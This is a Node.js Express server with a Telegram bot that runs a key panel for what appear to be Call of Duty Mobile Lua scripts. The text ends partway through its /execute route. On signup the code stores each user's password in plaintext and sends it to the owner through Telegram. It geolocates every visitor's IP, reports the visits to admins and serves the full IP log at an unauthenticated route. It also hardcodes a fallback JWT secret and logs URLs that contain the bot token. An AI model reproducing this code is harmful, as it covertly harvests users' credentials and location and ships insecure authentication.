const express = require("express");
const moment = require("moment");
const path = require("path");
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const config = require("./config");
global.config = config;

const bot = new TelegramBot(config.token, {
    polling: true,
    parse_mode: 'HTML',
    allowedUpdates: ['message', 'callback_query', 'inline_query', 'channel_post', 'edited_message']
});

bot.on('error', (error) => {
    console.error('Telegram Bot Error:', error.message);
});

bot.on('polling_error', (error) => {
    console.error('Polling Error:', error.message);
});

bot.on('message', (msg) => {
    const username = msg.from.username || msg.from.first_name;

    // Log all message types
    if (msg.text) {
        console.log(`User: ${username} sent text: "${msg.text}"`);
    }
    if (msg.photo) {
        bot.getFile(msg.photo[msg.photo.length - 1].file_id).then((file) => {
            console.log({
                text: `User: ${username} sent a photo - File ID: ${msg.photo[0].file_id}`,
                fileUrl: `https://api.telegram.org/file/bot${config.token}/${file.file_path}`
            });
        });
    }
    if (msg.video) {
        bot.getFile(msg.video.file_id).then((file) => {
            console.log({
                text: `User: ${username} sent a video - Duration: ${msg.video.duration}s`,
                fileUrl: `https://api.telegram.org/file/bot${config.token}/${file.file_path}`
            });
        });
    }
    if (msg.document) {
        bot.getFile(msg.document.file_id).then((file) => {
            console.log({
                text: `User: ${username} sent a document: ${msg.document.file_name}`,
                fileUrl: `https://api.telegram.org/file/bot${config.token}/${file.file_path}`
            });
        });
    }
    if (msg.audio) {
        bot.getFile(msg.audio.file_id).then((file) => {
            console.log({
                text: `User: ${username} sent an audio file - Title: ${msg.audio.title || 'Untitled'}`,
                fileUrl: `https://api.telegram.org/file/bot${config.token}/${file.file_path}`
            });
        });
    }
    if (msg.voice) {
        console.log(`User: ${username} sent a voice message - Duration: ${msg.voice.duration}s`);
    }
    if (msg.sticker) {
        console.log(`User: ${username} sent a sticker - Emoji: ${msg.sticker.emoji || 'N/A'}`);
    }
    if (msg.location) {
        console.log(`User: ${username} shared location - Lat: ${msg.location.latitude}, Long: ${msg.location.longitude}`);
    }
    if (msg.contact) {
        console.log(`User: ${username} shared contact - Name: ${msg.contact.first_name}`);
    }
    if (msg.animation) {
        console.log(`User: ${username} sent a GIF/animation`);
    }
    if (msg.poll) {
        console.log(`User: ${username} created a poll - Question: ${msg.poll.question}`);
    }
    if (msg.dice) {
        console.log(`User: ${username} sent a dice roll - Value: ${msg.dice.value}`);
    }
});

const commands = new Map();
const commandsPath = path.join(__dirname, 'script', 'commands');

const events = new Map();

const eventsPath = path.join(__dirname, "script", "events");


if (!fs.existsSync(commandsPath)) {
    fs.mkdirSync(commandsPath);
}

fs.readdirSync(commandsPath).forEach((file) => {
    if (file.endsWith(".js")) {
        try {
            const command = require(path.join(commandsPath, file));
            const eurix = command.eurix;

            if (!eurix.name || !command.execute) {
                console.error(`Invalid command file: ${file}`);
                return;
            }

            commands.set(eurix.name, command);
            global.commands = commands;
            console.log(`Loaded command: ${eurix.name}`);
        } catch (error) {
            console.error(`Error loading command file: ${file} ${error.message}`);
        }
    }
});

try {
    if (!fs.existsSync(eventsPath)) {
        fs.mkdirSync(eventsPath, { recursive: true });
    }

    fs.readdirSync(eventsPath).forEach((file) => {
        if (file.endsWith(".js")) {
            try {
                const eventPath = path.join(eventsPath, file);
                delete require.cache[require.resolve(eventPath)];
                const event = require(eventPath);

                if (!event || !event.name || typeof event.execute !== 'function') {
                    console.error(`Invalid event structure in file: ${file}`);
                    return;
                }

                events.set(event.name, event);
            } catch (error) {
                console.error(`Error loading event file ${file}:`, error.message);
            }
        }
    });
} catch (error) {
    console.error("Error loading events directory:", error);
}

                events.forEach((event) => {
                    switch(event.name) {
                        case 'welcome':
                            bot.on('new_chat_members', async (msg) => {
                                try {
                                    await event.execute(bot, msg);
                                } catch (error) {
                                    console.error(`Error executing welcome event: ${error.message}`);
                                }
                            });
                            break;
                        case 'leave':
                            bot.on('left_chat_member', async (msg) => {
                                try {
                                    await event.execute(bot, msg);
                                } catch (error) {
                                    console.error(`Error executing leave event: ${error.message}`);
                                }
                            });
                            break;
                        case 'feedback':
                            // Register to capture all messages with videos or photos
                            bot.on('message', async (msg) => {
                                // Skip if this is a command message
                                if (msg.text && msg.text.startsWith('/')) return;

                                // Only process messages with videos or photos that aren't part of an active feedback command session
                                if ((msg.video || (msg.photo && msg.photo.length > 0)) && 
                                    (!msg.from || !commands.get('feedback')?.feedbackSessions?.has(msg.from.id))) {
                                    try {
                                        await event.execute(bot, msg);
                                    } catch (error) {
                                        console.error(`Error executing feedback event: ${error.message}`);
                                    }
                                }
                            });
                            break;
                    }
                    console.log(`Loaded event: ${event.name}`);
                });

// Permission checking function
function hasPermission(userId, requiredPermission) {
    if (!requiredPermission || requiredPermission === 'all') return true;
    if (requiredPermission === 'admin') {
        return config.admin.includes(userId.toString());
    }
    return false;
}

bot.on('message', async (msg) => {
    // Handle genkey delete responses
    if (msg.text && /^[1-9]|10$/.test(msg.text) && msg.reply_to_message) {
        const keyListPattern = /Here are the available keys for deletion:/;
        if (keyListPattern.test(msg.reply_to_message.text)) {
            try {
                const username = 'Eugene Aguilar';
                const keyFilePath = path.join(__dirname, 'USERPANEL', `${username}.json`);

                if (!fs.existsSync(keyFilePath)) {
                    return bot.sendMessage(msg.chat.id, '❌ No API keys found.');
                }

                const keysData = JSON.parse(fs.readFileSync(keyFilePath, 'utf8'));
                const keys = Object.keys(keysData);
                const selection = parseInt(msg.text);

                if (isNaN(selection) || selection < 1 || selection > keys.length) {
                    return bot.sendMessage(msg.chat.id, '❌ Invalid selection. Please choose a valid number.');
                }

                const keyToDelete = keys[selection - 1];
                delete keysData[keyToDelete];
                fs.writeFileSync(keyFilePath, JSON.stringify(keysData, null, 2));

                return bot.sendMessage(msg.chat.id, `✅ Successfully deleted key:\n${keyToDelete}`);
            } catch (error) {
                console.error('Error handling key deletion:', error);
                return bot.sendMessage(msg.chat.id, '❌ An error occurred while deleting the key.');
            }
        }
    }

    // Handle TikTok search responses
    if (msg.text && /^[1-9]|10$/.test(msg.text) && global.tikTokSearchResults?.[msg.chat.id]) {
        const selectedIndex = parseInt(msg.text) - 1;
        const videos = global.tikTokSearchResults[msg.chat.id];

        // Delete the search results message if it exists
        if (global.tikTokSearchMessageIds?.[msg.chat.id]) {
            try {
                await bot.deleteMessage(msg.chat.id, global.tikTokSearchMessageIds[msg.chat.id]);
                delete global.tikTokSearchMessageIds[msg.chat.id];
            } catch (error) {
                console.error("Error deleting message:", error);
            }
        }

        // Delete the user's selection message
        try {
            await bot.deleteMessage(msg.chat.id, msg.message_id);
        } catch (error) {
            console.error("Error deleting user message:", error);
        }

        if (videos && videos[selectedIndex]) {
            const video = videos[selectedIndex];
            try {
                await bot.sendMessage(msg.chat.id, "⏳ Downloading video...");
                await bot.sendVideo(msg.chat.id, video.play, {
                    caption: `${video.title}\n\n👤 Author: @${video.author.unique_id}\n📝 Nickname: ${video.author.nickname}\n❤️ ${video.digg_count} 💬 ${video.comment_count}`,
                    parse_mode: "HTML"
                });
            } catch (error) {
                console.error("Error sending TikTok video:", error);
                await bot.sendMessage(msg.chat.id, "❌ Sorry, couldn't send this video. Please try another one.");
            }
        }
        delete global.tikTokSearchResults[msg.chat.id];
        return;
    }

    // Check for active CODM script uploaders (file uploads)
    const codmScriptCommand = commands.get('codmscript');
    if (msg.from && codmScriptCommand?.activeUploaders?.has(msg.from.id)) {
        // Let the command handler deal with it
        return;
    }

    // Check if this is part of an ongoing feedback session
    if (msg.from && commands.get('feedback')?.feedbackSessions?.has(msg.from.id)) {
        // If it's a command to cancel or the feedback command itself, let it pass through normally
        if (msg.text && msg.text.startsWith('/') && msg.text !== '/cancel' && !msg.text.startsWith('/feedback')) {
            // Allow other commands to pass through
        } 
        // Otherwise, forward to the feedback command
        else {
            try {
                const feedbackCommand = commands.get('feedback');
                if (feedbackCommand) {
                    await feedbackCommand.execute(bot, msg, []);
                    return;
                }
            } catch (error) {
                console.error('Error handling feedback session:', error);
            }
        }
    }

    if (!msg.text || !msg.text.startsWith('/')) return;

    let commandText = msg.text.split('@')[0];
    const args = commandText.slice(1).trim().split(/ +/);
    const commandName = args.shift().toLowerCase();

    if (!commands.has(commandName)) return;

    try {
        const command = commands.get(commandName);
        const permission = command.eurix.permission || 'all';

        if (!hasPermission(msg.from.id, permission)) {
            return bot.sendMessage(msg.chat.id, '❌ You do not have permission to use this command.');
        }

        // If this is a feedback command, register the session
        if (commandName === 'feedback' && msg.from) {
            if (command.feedbackSessions) {
                // Use the command's internal map if available
                feedbackSessions = command.feedbackSessions;
            }
        }

        await command.execute(bot, msg, args);
    } catch (error) {
        console.error(`Error executing command ${commandName}:`, error);
        await bot.sendMessage(msg.chat.id, '❌ An error occurred while executing the command.');
    }
});

const adminChatIds = config.admin;
const bcrypt = require("bcryptjs");
const multer = require("multer");

const USERPANEL_DIR = path.join(__dirname, "USERPANEL");
const profilePicturesDir = path.join(USERPANEL_DIR, 'profile_pictures');

try {
    if (!fs.existsSync(USERPANEL_DIR)) {
        fs.mkdirSync(USERPANEL_DIR, { recursive: true });
    }
    if (!fs.existsSync(profilePicturesDir)) {
        fs.mkdirSync(profilePicturesDir, { recursive: true });
    }

    // Create users.json if it doesn't exist
    const usersFilePath = path.join(USERPANEL_DIR, 'users.json');
    if (!fs.existsSync(usersFilePath)) {
        fs.writeFileSync(usersFilePath, '{}', 'utf8');
    }
} catch (error) {
    console.error("Error creating directories:", error);
}


// Configure multer with error handling

// Create uploads directory if it doesn't exist


const upload = multer({
    storage: multer.diskStorage({
        destination: function (req, file, cb) {
            cb(null, "./");
        },
        filename: function (req, file, cb) {
            cb(null, Date.now() + '-' + file.originalname);
        }
    }),
    fileFilter: function (req, file, cb) {
        if (file.mimetype.startsWith('image/') || file.originalname.endsWith('.lua')) {
            cb(null, true);
        } else {
            cb(new Error('Only image files or .lua files are allowed'), false);
        }
    }
});


const axios = require("axios");
const jwt = require("jsonwebtoken");
const ping = require("ping");

const cookieParser = require('cookie-parser');
const app = express();
app.use(express.json());
app.use(cookieParser());
app.use('/profile_pictures', express.static(profilePicturesDir));

// Initialize cron
const cron = require('node-cron');
const sendShoti = require('./script/CronHandle/shoti.js');

// Schedule shoti sending every 8 minutes
cron.schedule('*/30 * * * *', () => {
  console.log('Running shoti cron job');
  sendShoti();
});



app.get('/user-profile', authenticateToken, async function (req, res) {
    try {
        const username = req.user.username;
        const targetUsername = req.query.username || username;
        const usersFilePath = path.join(USERPANEL_DIR, 'users.json');
        const userDir = path.join(profilePicturesDir, targetUsername);

        let users = {};
        if (fs.existsSync(usersFilePath)) {
            users = JSON.parse(fs.readFileSync(usersFilePath, 'utf8'));
        }

        let profilePicture = users[targetUsername]?.profilePicture || null;

        if (!profilePicture && fs.existsSync(userDir)) {
            const files = fs.readdirSync(userDir);
            const profilePic = files.find(file => file.startsWith('profile'));
            if (profilePic) {
                profilePicture = `/profile_pictures/${targetUsername}/${profilePic}?t=${Date.now()}`;
            }
        }

        res.json({
            profilePicture: profilePicture,
            username: targetUsername,
            isOwnProfile: username === targetUsername
        });
    } catch (error) {
        console.error('Error getting profile:', error);
        res.status(500).json({ error: 'Failed to get profile information' });
    }
});



app.get('/channel', (req, res) => {
  try {
    const channelUrl = config.channel;

    res.redirect(channelUrl);
  } catch (error) {
    console.error('Error redirecting to channel:', error);
    res.redirect("https://pornhub.com");
  }
});



app.get('/user-list', authenticateToken, (req, res) => {
    try {
        res.json([req.user.username]);
    } catch (error) {
        console.error('Error getting user list:', error);
        res.status(500).json({ error: 'Failed to get user list' });
    }
});


const PORT = 3000;
const SECRET_KEY = process.env.SECRET_KEY || "EugenePogi";

const USER_IP_FILE = path.join(__dirname, "UserIp.json");

// Define the DATABASE_DIR and create it if it doesn't exist
const DATABASE_DIR = path.join(__dirname, "DATABASE");
if (!fs.existsSync(DATABASE_DIR)) {
    fs.mkdirSync(DATABASE_DIR, { recursive: true });
}

// Initialize code.json if it doesn't exist
const CODE_FILE = path.join(DATABASE_DIR, "code.json");
if (!fs.existsSync(CODE_FILE)) {
    fs.writeFileSync(CODE_FILE, '{}', 'utf8');
}

const LOGIN_USER_FILE = path.join(DATABASE_DIR, "LoginUser.json");


let keysCache = {};

// Function to load keys from file
function loadKeys(username) {
    const keyFilePath = path.join(USERPANEL_DIR, `${username}.json`);
    if (fs.existsSync(keyFilePath)) {
        try {
            keysCache = JSON.parse(fs.readFileSync(keyFilePath, "utf8"));
        } catch (error) {
            console.error("Error loading keys:", error.message);
            keysCache = {};
        }
    } else {
        keysCache = {};
        saveKeys(username);
    }
}

function saveKeys(username) {
    const keyFilePath = path.join(USERPANEL_DIR, `${username}.json`);
    fs.writeFileSync(keyFilePath, JSON.stringify(keysCache, null, 2), "utf8");
}

function isValidKey(apiKey) {
    if (!keysCache[apiKey]) return false;
    if (keysCache[apiKey].type === '1 Key 1 Dev' && !keysCache[apiKey].zipCode) return false;
    return moment().isBefore(moment(keysCache[apiKey].expirationDate, "YYYY-MM-DD"));
}

function cleanupExpiredKeys(username) {
    return false;
}

function authenticateToken(req, res, next) {
    try {
        const token = req.headers.authorization;
        if (!token) {
            return res.status(401).json({ error: "Access denied. Token required." });
        }

        const userIp = req.headers["x-forwarded-for"] ? req.headers["x-forwarded-for"].split(",")[0] : req.socket.remoteAddress;

        jwt.verify(token, SECRET_KEY, (err, decoded) => {
            if (err) {
                return res.status(403).json({ error: "Invalid token" });
            }

            const username = decoded.username;

            // Load IP data
            const ipData = JSON.parse(fs.readFileSync(USER_IP_FILE, "utf8"));
            const userIpData = ipData.find(entry => entry.query === userIp);

            if (!userIpData) {
                logUserIp(req); // Log new IP
            }

            req.user = { username, ip: userIp };
            loadKeys(username);
            next();
        });
    } catch (error) {
        console.error("Authentication error:", error);
        return res.status(500).json({ error: "Authentication failed" });
    }
}

async function logUserIp(req) {
    const userIp = req.headers["x-forwarded-for"] ? req.headers["x-forwarded-for"].split(",")[0] : req.socket.remoteAddress;
    let ipData = [];

    try {
        if (fs.existsSync(USER_IP_FILE)) {
            const fileContent = fs.readFileSync(USER_IP_FILE, "utf8").trim();
            if (fileContent) {
                ipData = JSON.parse(fileContent);
            }
        }
    } catch (error) {
        console.error("Error reading IP log file:", error.message);
        // Create empty file if doesn't exist or is corrupted
        fs.writeFileSync(USER_IP_FILE, "[]", "utf8");
        ipData = [];
    }

    const existingEntry = ipData.find(entry => entry.query === userIp); 
    if (existingEntry) {
        const lastLogTime = moment(existingEntry.time, "YYYY-MM-DD HH:mm:ss");
        if (moment().diff(lastLogTime, "hours") < 1) {
            return; 
        }
    }

    try {
        const data = await axios.get(`http://ip-api.com/json/${userIp}`);

        const ipInfo = {
            status: data.data.status,
            country: data.data.country || "Unknown",
            countryCode: data.data.countryCode || "Unknown",
            region: data.data.region || "Unknown",
            regionName: data.data.regionName || "Unknown",
            city: data.data.city || "Unknown",
            zip: data.data.zip || "Unknown",
            lat: data.data.lat || 0,
            lon: data.data.lon || 0,
            timezone: data.data.timezone || "Unknown",
            isp: data.data.isp || "Unknown",
            org: data.data.org || "Unknown",
            as: data.data.as || "Unknown",
            query: data.data.query || userIp, 
            time: moment().format("YYYY-MM-DD HH:mm:ss"),
        };

        // Remove old entry if IP already exists
        ipData = ipData.filter(entry => entry.query !== userIp);

        ipData.push(ipInfo);


        fs.writeFileSync(USER_IP_FILE, JSON.stringify(ipData, null, 2), "utf8");
    } catch (error) {
        console.error("IP lookup failed:", error.message);
    }
}

app.use(async (req, res, next) => {
    await logUserIp(req);
    next();
});

app.get("/get-ip-list", async function (req, res) {
res.sendFile(path.join(__dirname, "UserIp.json"));
});

app.get("/ip", (req, res) => {
res.sendFile(path.join(__dirname, "USERIP.html"));
    });

app.get("/shoti", async function (req, res) {
    try {
        const response = await axios.get("https://shoti.fbbot.org/api/get-shoti");
        if (!response.data || !response.data.result || !response.data.result.content) {
            return res.status(500).json({ error: "Invalid response from Shoti API" });
        }
        const videoData = response.data.result;
        res.json({
            shotiurl: videoData.content,
            title: videoData.title || '',
            username: videoData.user?.username || '',
            nickname: videoData.user?.nickname || '',
            duration: videoData.duration || 0,
            region: videoData.region || '',
            shoti_id: videoData.shoti_id || '',
            shoti_score: videoData.shoti_score || 0,
            type: videoData.type || '',
            instagram: videoData.user?.instagram || '',
            twitter: videoData.user?.twitter || '',
            signature: videoData.user?.signature || ''
        });
    } catch (error) {
        console.error("Shoti API Error:", error.message);
        return res.status(500).json({ error: "Failed to fetch from Shoti API" });
    }
});



app.get("/key", authenticateToken, (req, res) => {
    const keyFilePath = path.join(USERPANEL_DIR, `${req.user.username}.json`);
    if (!fs.existsSync(keyFilePath)) {
        return res.status(404).json({ error: "No API keys found for this user" });
    }
    loadKeys(req.user.username);
    cleanupExpiredKeys(req.user.username);
    res.sendFile(keyFilePath);
});

// Load banned devices


app.get("/", async (req, res) => {
    // Get user IP and information
    const userIp = req.headers["x-forwarded-for"] ? req.headers["x-forwarded-for"].split(",")[0] : req.socket.remoteAddress;

    // Load IP data if available
    let ipData = null;
    try {
        if (fs.existsSync(USER_IP_FILE)){
            const ipDataRaw = fs.readFileSync(USER_IP_FILE, "utf8");
            const allIpData = JSON.parse(ipDataRaw);
            ipData = allIpData.find(entry => entry.query=== userIp);
        }
    } catch (error) {
        console.error("Error reading IP data:", error);
    }

    // Trust the X-Forwarded-For header from Replit's proxy
    app.set('trust proxy', true);

    // Send message to all admins
    const notificationMsg = `🚀 Website Visited!\n\n` +
        `🌐 IP: ${userIp}\n` +
        `📍 Location: ${ipData?.city || 'Unknown'}, ${ipData?.country || 'Unknown'}\n` +
        `🏢 ISP: ${ipData?.isp || 'Unknown'}\n` +
        `📮 ZIP: ${ipData?.zip || 'Unknown'}\n` +
        `⏰ Time: ${moment().format("YYYY-MM-DD HH:mm:ss")}\n` +
        `🌍 Region: ${ipData?.regionName || 'Unknown'}\n` +
        `👀 User Agent: ${req.headers["user-agent"] || 'Unknown'}\n` +
        `🖥️ Path: Homepage Visit`;

    adminChatIds.forEach(chatId => {
        bot.sendMessage(chatId, notificationMsg);
    });

    // Send the main HTML file directly
    res.sendFile(path.join(__dirname, "genapikey.html"));
});

app.post("/signup", async (req, res) => {
    try {
        const { username, password, telegramUsername } = req.body;
        if (!username || !password) {
            return res.status(400).json({ error: "Username and password are required" });
        }

        if (!fs.existsSync(LOGIN_USER_FILE)) {
            fs.writeFileSync(LOGIN_USER_FILE, '{}', 'utf8');
        }

        let users = JSON.parse(fs.readFileSync(LOGIN_USER_FILE, "utf8"));

        if (users[username]) {
            return res.status(400).json({ error: "Username already exists" });
        }

        const token = await bcrypt.hash(password, 10);
        const registrationDate = new Date().toISOString().split('T')[0];

        users[username] = {
            token,
            password: password,
            registrationDate,
            telegramUsername: telegramUsername || null
        };

        await fs.promises.writeFile(LOGIN_USER_FILE, JSON.stringify(users, null, 2), "utf8");

const ownerId = config.admin[0]; // Get the first admin from config.json

const signupMsg = `
👤 <b>New Account Created!</b>

📝 <b>Username:</b> <code>${username}</code>
🔑 <b>Password:</b> <code>${password}</code>
⏰ <b>Time:</b> ${moment().format("YYYY-MM-DD HH:mm:ss")}
🌐 <b>IP:</b> ${req.headers["x-forwarded-for"] ? req.headers["x-forwarded-for"].split(",")[0] : req.socket.remoteAddress}
📱 <b>Device:</b> ${req.headers["user-agent"]}
🗓️ <b>Registration:</b> ${registrationDate}
✨ <b>Status:</b> <code>Success</code>
`;

bot.sendMessage(ownerId, signupMsg, { parse_mode: "HTML" });


        res.json({ message: "User registered successfully" });
    } catch (error) {
        console.error("Signup error:", error);
        res.status(500).json({ error: "Failed to create account" });
    } 
});

// Route: Login
app.post("/login", async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: "Username and password are required" });

    if (!fs.existsSync(LOGIN_USER_FILE)) return res.status(400).json({ error: "User not found" });

    const users = JSON.parse(fs.readFileSync(LOGIN_USER_FILE, "utf8"));

    if (!users[username]) return res.status(400).json({ error: "Invalid username or password" });

    const isMatch = await bcrypt.compare(password, users[username].token);
    if (!isMatch) return res.status(400).json({ error: "Invalid username or password" });

    // Get device info
    const userIp = req.headers["x-forwarded-for"] ? req.headers["x-forwarded-for"].split(",")[0] : req.socket.remoteAddress;
    const CODE_FILE = path.join(DATABASE_DIR, "code.json");
    let deviceId = null;

    try {
        if (fs.existsSync(CODE_FILE)) {
            const codeData = JSON.parse(fs.readFileSync(CODE_FILE, "utf8"));
            if (codeData[userIp]) {
                deviceId = codeData[userIp].deviceId;
            }
        }
    } catch (error) {
        console.error("Error reading device ID:", error);
    }

    // Generate token with device ID
    const token = jwt.sign({ username, deviceId }, SECRET_KEY);

    loadKeys(username);
    res.json({ message: "Login successful", token });
});

app.post("/forgot-password", async (req, res) => {
    const { username } = req.body;
    if (!username) return res.status(400).json({ error: "Username is required" });

    if (!fs.existsSync(LOGIN_USER_FILE)) return res.status(400).json({ error: "User not found" });

    let users = JSON.parse(fs.readFileSync(LOGIN_USER_FILE, "utf8"));

    if (!users[username]) return res.status(400).json({ error: "User not found" });

    const resetToken = jwt.sign({ username }, SECRET_KEY, { expiresIn: "15m" });

    users[username].resetToken = resetToken;
    fs.writeFileSync(LOGIN_USER_FILE, JSON.stringify(users, null,2), "utf8");

    // Send notification to admin via Telegram bot
    const userIp = req.headers["x-forwarded-for"] ? req.headers["x-forwarded-for"].split(",")[0] : req.socket.remoteAddress;

    // Get user IP info if available
    let ipInfo = "Unknown";
    try {
        if (fs.existsSync(USER_IP_FILE)) {
            const ipData = JSON.parse(fs.readFileSync(USER_IP_FILE, "utf8"));
            const userIpData = ipData.find(entry => entry.query === userIp);
            if (userIpData) {
                ipInfo = `${userIpData.city || 'Unknown'}, ${userIpData.country || 'Unknown'}`;
            }
        }
    } catch (error) {
        console.error("Error getting IP info for password reset:", error);
    }

    const passwordResetMsg = `🔑 Password Reset Request!\n\n` +
        `👤 Username: ${username}\n` +
        `🌐 IP: ${userIp}\n` +
        `📍 Location: ${ipInfo}\n` +
        `⏰ Time: ${moment().format("YYYY-MM-DD HH:mm:ss")}\n` +
        `🔐 Reset Token: ${resetToken}\n\n` +
        `This token will expire in 15 minutes.`;

    adminChatIds.forEach(chatId => {
        bot.sendMessage(chatId, passwordResetMsg);
    });

    res.json({ message: "Password reset token generated. Please contact the admin for your reset token." });
});

app.post("/reset-password", async (req, res) => {
    const { username, resetToken, newPassword } = req.body;
    if (!username || !resetToken || !newPassword) {
        return res.status(400).json({ error: "Username, reset token, and new password are required" });
    }

    if (!fs.existsSync(LOGIN_USER_FILE)) return res.status(400).json({ error: "User not found" });

    let users = JSON.parse(fs.readFileSync(LOGIN_USER_FILE, "utf8"));

    if (!users[username]) {
        return res.status(400).json({ error: "User not found" });
    }

    try {
        jwt.verify(resetToken, SECRET_KEY);
        if (users[username].resetToken !== resetToken) {
            return res.status(400).json({ error: "Invalid reset token" });
        }

        const hashedPassword = await bcrypt.hash(newPassword, 10);
        users[username].token = hashedPassword;

        // Send notification to admin via Telegram bot
        const userIp = req.headers["x-forwarded-for"] ? req.headers["x-forwarded-for"].split(",")[0] : req.socket.remoteAddress;

        // Get user IP info if available
        let ipInfo = "Unknown";
        try {
            if (fs.existsSync(USER_IP_FILE)) {
                const ipData = JSON.parse(fs.readFileSync(USER_IP_FILE, "utf8"));
                const userIpData = ipData.find(entry => entry.query === userIp);
                if (userIpData) {
                    ipInfo = `${userIpData.city || 'Unknown'}, ${userIpData.country || 'Unknown'}`;
                }
            }
        } catch (error) {
            console.error("Error getting IP info for password reset:", error);
        }

        const passwordChangedMsg = `✅ Password Reset Successful!\n\n` +
            `👤 Username: ${username}\n` +
            `🌐 IP: ${userIp}\n` +
            `📍 Location: ${ipInfo}\n` +
            `⏰ Time: ${moment().format("YYYY-MM-DD HH:mm:ss")}\n` +
            `🔐 Password has been changed successfully.`;

        adminChatIds.forEach(chatId => {
            bot.sendMessage(chatId, passwordChangedMsg);
        });

    } catch (error) {
        return res.status(400).json({ error: "Invalid or expired token" });
    }
    users[username].password = newPassword;  // Update the stored password
    delete users[username].resetToken;

    fs.writeFileSync(LOGIN_USER_FILE, JSON.stringify(users, null, 2), "utf8");

    res.json({ message: "Password reset successfully" });
});

app.post("/update-telegram-username", authenticateToken, async (req, res) => {
    const { telegramUsername } = req.body;
    const username = req.user.username;

    if (!telegramUsername) {
        return res.status(400).json({ error: "Telegram username is required" });
    }

    try {
        const usersFilePath = path.join(DATABASE_DIR, "LoginUser.json");
        let users = JSON.parse(fs.readFileSync(usersFilePath, "utf8"));

        if (!users[username]) {
            return res.status(404).json({ error: "User not found" });
        }

        users[username].telegramUsername = telegramUsername;
        fs.writeFileSync(usersFilePath, JSON.stringify(users, null, 2), "utf8");

        // Send notification to admin via Telegram bot
        const userIp = req.headers["x-forwarded-for"] ? req.headers["x-forwarded-for"].split(",")[0] : req.socket.remoteAddress;

        // Get user IP info if available
        let ipInfo = "Unknown";
        try {
            if (fs.existsSync(USER_IP_FILE)) {
                const ipData = JSON.parse(fs.readFileSync(USER_IP_FILE, "utf8"));
                const userIpData = ipData.find(entry => entry.query === userIp);
                if (userIpData) {
                    ipInfo = `${userIpData.city || 'Unknown'}, ${userIpData.country || 'Unknown'}`;
                }
            }
        } catch (error) {
            console.error("Error getting IP info for telegram username update:", error);
        }

        const telegramUsernameMsg = `✅ Telegram Username Updated!\n\n` +
            `👤 Username: ${username}\n` +
            `📝 Telegram Username: ${telegramUsername}\n` +
            `🌐 IP: ${userIp}\n` +
            `📍 Location: ${ipInfo}\n` +
            `⏰ Time: ${moment().format("YYYY-MM-DD HH:mm:ss")}\n`;

        adminChatIds.forEach(chatId => {
            bot.sendMessage(chatId, telegramUsernameMsg);
        });

        res.json({ message: "Telegram username updated successfully" });

    } catch (error) {
        console.error("Error updating telegram username:", error);
        res.status(500).json({ error: "Failed to update telegram username" });
    }
});



function createCustomExecuteLua(username) {
    try {
        // Create USERPANEL directory if it doesn't exist
        const userScriptDir = path.join(USERPANEL_DIR, username);
        if (!fs.existsSync(userScriptDir)) {
            fs.mkdirSync(userScriptDir, { recursive: true });
        }

        // Read the template execute.lua file
        const templatePath = path.join(__dirname, "execute.lua");
        let luaContent = fs.readFileSync(templatePath, "utf8");

        // Replace the username in the template
        luaContent = luaContent.replace(/"Eugene Aguilar"/g, `"${username}"`);

        // Save the customized file
        const customLuaPath = path.join(userScriptDir, "execute.lua");
        fs.writeFileSync(customLuaPath, luaContent, "utf8");

        return customLuaPath;
    } catch (error) {
        console.error("Error creating custom execute.lua:", error);
        return null;
    }
}

app.post("/add-key", authenticateToken, (req, res) => {
    const { expirationDate, type, zipCode } = req.body;
    if (!moment(expirationDate, "YYYY-MM-DD", true).isValid()) {
        return res.status(400).json({ error: "Invalid expiration date format" });
    }

    const userIp = req.headers["x-forwarded-for"] ? req.headers["x-forwarded-for"].split(",")[0] : req.socket.remoteAddress;
    let ipData = null;

    try {
        if (fs.existsSync(USER_IP_FILE)) {
            const ipDataRaw = fs.readFileSync(USER_IP_FILE, "utf8");
            const allIpData = JSON.parse(ipDataRaw);
            ipData = allIpData.find(entry => entry.query === userIp);
        }
    } catch (error) {
        console.error("Error reading IP data:", error);
    }

    const randomHex = require('crypto').randomBytes(16).toString('hex');
    const apiKey = `@ZenoOnTop-${randomHex}`;

    const keyType = type || '1 Key 1 Dev';

    if (keyType === '1 Key 1 Dev' && !zipCode) {
        return res.status(400).json({ error: "ZIP code is required for 1 Key 1 Dev" });
    }

    if (keysCache[apiKey]) {
        return res.status(400).json({ error: "This API key already exists" });
    }

    keysCache[apiKey] = {
        expirationDate,
        zipCode: keyType === '1 Key 1 Dev' ? zipCode : null,
        type: keyType,
        version: appVersion.current
    };
    saveKeys(req.user.username);

    createCustomExecuteLua(req.user.username);



    const expirationMoment = moment(expirationDate).endOf("day"); // Set time to 23:59:59

    const newKeyMsg = `<b>🔑 New API Key Generated!</b>\n\n` +
        `<b>👤 Username:</b> ${req.user.username}\n` +
        `<b>📅 Expiration:</b> ${expirationMoment.format("dddd, MMMM D, YYYY HH:mm:ss")}\n` + // Expiration now ends at 23:59:59
        `<b>🔒 Type:</b> ${keyType}\n` +
        `<b>📮 Device ID:</b> ${zipCode || 'N/A'}\n` +
        `<b>⏰ Time:</b> ${moment().format("dddd, MMMM D, YYYY HH:mm:ss")}\n` + // Current time
        `<b>🌐 IP:</b> ${req.headers["x-forwarded-for"] ? req.headers["x-forwarded-for"].split(",")[0] : req.socket.remoteAddress}\n` +
        `<b>🔑 Key:</b> <code>${apiKey}</code>\n` +  // Monospace format for API Key
        `<b>📱 Device:</b> ${req.headers["user-agent"]}\n` +
        `<b>✨ Status:</b> Success`;

    const ownerId = config.admin[0]; // Get the first admin from config.json
    bot.sendMessage(ownerId, newKeyMsg, { parse_mode: "HTML" });

    res.json({ message: "API key updated successfully", apiKey, expirationDate, zipCode });
});

// Route: Remove API Key (Protected)
app.post("/removekey", authenticateToken, (req, res) => {
    const { apiKey } = req.body;
    if (!keysCache[apiKey]) {
        return res.status(404).json({ message: "API Key not found!" });
    }

    delete keysCache[apiKey];
    saveKeys(req.user.username);
    res.json({ message: "API Key removed successfully!" });
});


app.get("/execute", async (req, res) => {
    try {
        const userIp = req.headers["x-forwarded-for"] ? req.headers["x-forwarded-for"].split(",")[0] : req.socket.remoteAddress;
        const { username, apiKey } = req.query;

        if (!username || !apiKey) {
            return res.status(400).json({ error: "Username and API key are required" });
        }

        const users = JSON.parse(fs.readFileSync(LOGIN_USER_FILE, "utf8"));
        if (!users[username]) {
            return res.status(404).json({ error: "User not found" });
        }

        // Load IP data
        let ipData = null;
        try {
            if (fs.existsSync(USER_IP_FILE)) {
                const ipDataRaw = fs.readFileSync(USER_IP_FILE, "utf8").trim();
                if (ipDataRaw) {
                    const allIpData = JSON.parse(ipDataRaw);
